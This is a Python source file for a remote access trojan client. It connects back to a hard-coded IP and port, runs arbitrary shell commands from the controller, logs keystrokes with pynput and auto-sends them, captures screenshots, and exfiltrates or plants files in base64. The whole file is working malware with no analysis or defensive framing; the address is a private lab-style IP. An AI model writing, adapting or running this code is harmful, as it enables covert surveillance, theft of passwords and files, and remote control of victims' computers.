import datetime
import os
import socket
import subprocess
import shutil
import sys
import base64
import io 

try:
    from PIL import ImageGrab
except Exception:
    # Fall back to pyscreenshot if Pillow is not available (helps environments
    # where PIL cannot be resolved). If neither is available, ImageGrab will
    # be None and callers should handle that case.
    try:
        from pyscreenshot import grab as ImageGrab  # type: ignore
    except Exception:
        ImageGrab = None
from pathlib import Path
from collections.abc import MutableSequence
from time import sleep
from pynput import keyboard # type: ignore

IP = "192.168.56.1"
PORT = 443
MAX_BUFFER_SIZE = 500

class keylog_buffer(MutableSequence):
    def __init__(self, max_size):
        self._data = []
        self.max_size = max_size

    def __len__(self):
        return len(self._data)

    def __getitem__(self, index):
        return self._data[index]

    def __setitem__(self, index, value):
        self._data[index] = value

    def __delitem__(self, index):
        del self._data[index]

    def insert(self, index, value):
        if len(self._data) < self.max_size:
            self._data.insert(index, value)

    def append(self, value):
        if len(self._data) < self.max_size:
            self._data.append(value)

    def clear(self):
        self._data.clear()

    def to_string(self):
        return "".join(self._data)

    def extend(self, iterable):
        for item in iterable:
            self.append(item)


def take_screenshot(c):
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        raw_bytes = buf.getvalue()

        encoded = base64.b64encode(raw_bytes).decode('utf-8')

        header = (
            f"[+] Screenshot captured\n"
            f"[+] Filename: screenshot.png\n"
            f"[+] Size: {len(raw_bytes)} bytes\n"
            f"[FILE_START]"
        )
        c.send(header.encode())
        c.send(encoded.encode())
        c.send(b"\n[FILE_END]\n\n")

    except Exception as e:
        c.send(f"[-] Screenshot failed: {e}\n\n".encode())

def download_file(filepath):
    try:
        if not os.path.exists(filepath):
            return {
                'success': False,
                'error': 'file not found'
            }
        with open(filepath, 'rb') as f:
            file_data = f.read()

            return {
                'success': True,
                'filename': Path(filepath).name,
                'data': base64.b64encode(file_data).decode('utf-8'),
                'size': len(file_data)
            }

    except Exception as e:
        return {
            'success': False,
            'error': str(e)
        }


def upload_file(filepath, file_base64):
    try:
        file_data = base64.b64decode(file_base64)

        directory = os.path.dirname(filepath)
        if directory and not os.path.exists(directory):
            os.makedirs(directory)

        with open(filepath, 'wb') as f:
            f.write(file_data)

        return {
            'success': True,
            'filepath': filepath,
            'size': len(file_data)
        }

    except Exception as e:
        return {
            'success': False,
            'error': str(e)
        }


keylog_buffer = keylog_buffer(MAX_BUFFER_SIZE)
buffer_auto_send_pending = False
keylogger_active = False
listener = None


def format_key(key):
    try:
        return key.char
    except AttributeError:
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[DELETE]",
            keyboard.Key.shift: " ",
            keyboard.Key.ctrl: " ",
            keyboard.Key.alt: " ",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            keyboard.Key.delete: "[DEL]",
            keyboard.Key.home: "[HOME]",
            keyboard.Key.end: "[END]",
            keyboard.Key.cmd: "[WIN]",
            
        }

        if key in special_keys:
            return special_keys[key]
        return f"[{key.name.upper()}]"


def on_press(key):
    global keylog_buffer, buffer_auto_send_pending

    formatted = format_key(key)
    if formatted and len(keylog_buffer) < MAX_BUFFER_SIZE:
        keylog_buffer.append(formatted)

    if len(keylog_buffer) >= MAX_BUFFER_SIZE:
        buffer_auto_send_pending = True


def get_keylog_data():
    global keylog_buffer

    if not keylog_buffer:
        return "[i] No keylog data available."

    timestamp = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    data = f"[{timestamp}] " + "".join(keylog_buffer)
    keylog_buffer = []

    return data


def start_keylogger():
    global keylogger_active, listener

    if keylogger_active:
        return "[i] Keylogger is already running."

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    keylogger_active = True
    return "[+] Keylogger started."


def stop_keylogger():
    global keylogger_active, listener

    if not keylogger_active:
        return "[i] Keylogger not running."

    if listener:
        listener.stop()
        listener = None
        keylogger_active = False
        return "[+] Keylogger stopped."

    return "[i] Keylogger not running."


def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))
        print(f"Connected to {ip}:{port}")
        return c
    except Exception as e:
        print(f"Error connecting to {ip}:{port} - {e}")
        return None


def listen(c):
    global buffer_auto_send_pending
    try:
        while True:
            if buffer_auto_send_pending:
                data = get_keylog_data()
                c.send(f"[AUTO SEND] {data}\n".encode())
                buffer_auto_send_pending = False

            c.settimeout(0.5)

            try:
                data = c.recv(1024).decode().strip()
                if data == "/exit":
                    return
                else:
                    cmd(c, data)

            except socket.timeout:
                continue

    except Exception as e:
        print(f"Listen function error: {e}")


def cmd(c, data):
    try:
        if data.startswith("cd "):
            os.chdir(data[3:].strip())
            c.send(b"[i] Changed directory\n")
            return

        elif data == "/keylog on":
            response = start_keylogger()
            c.send(response.encode() + b"\n\n")
            return

        elif data == "/keylog off":
            response = stop_keylogger()
            c.send(response.encode() + b"\n\n")
            return

        elif data == "/keylog data":
            keylog_data = get_keylog_data()
            c.send(keylog_data.encode() + b"\n\n")
            return

        elif data == "/keylog status":
            status = "running" if keylogger_active else "stopped"
            buffer_size = len(keylog_buffer)
            response = f"[i] Keylogger is {status}. Buffer size: {buffer_size} characters."
            c.send(status.encode() + b"\n\n")
            return

        elif data == "/screenshot":
            take_screenshot(c)
            return

        elif data.startswith("/download"):
            filepath = data[10:].strip()
            c.send(b"[i] Preparing file for download...\n")

            result = download_file(filepath)

            if result['success']:
                info = (
                    f"[+] File ready for download\n"
                    f"[i] Filename: {result['filename']}\n"
                    f"[i] Size: {result['size']} bytes\n"
                    f"[FILE_START]\n"
                )
                c.send(info.encode())
                c.send(result['data'].encode())
                c.send(b"\n[FILE_END]\n\n")

            else:
                c.send(f"[-] Download failed: {result['error']}\n\n".encode())
            return

        elif data.startswith("/upload"):
            filepath = data[8:].strip()
            c.send(b"[i] Ready to receive file.\n")

            c.settimeout(30)
            file_data = b""

            while True:
                chunk = c.recv(4096)
                if not chunk:
                    break

                file_data += chunk

                if b"[UPLOAD_END]" in file_data:
                    break

            file_base64 = file_data.split(b"[UPLOAD_END]")[0].decode('utf-8').strip()

            result = upload_file(filepath, file_base64)

            if result['success']:
                response = (
                    f"[+] File uploaded successfully!\n"
                    f"[i] Path: {result['filepath']}\n"
                    f"[i] Size: {result['size']} bytes\n"
                )
                c.send(response.encode() + b"\n")
            else:
                c.send(f"[-] Upload failed: {result['error']}\n\n".encode())
                return
        
        else:
            p = subprocess.Popen(
                data,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )

            out, err = p.communicate()

            if out is None:
                out = b""

            if err is None:
                err = b""

            c.sendall(out + err + b"\n\n")

    except Exception as e:
        print(f"CMD function error: {e}")


if __name__ == "__main__":
    try:
        while True:
            client = connect(IP, PORT)

            if client:
                listen(client)

            print("Reconnecting in 0.5 seconds...")
            sleep(0.5)

    except KeyboardInterrupt:
        print("\nClient stopped.")
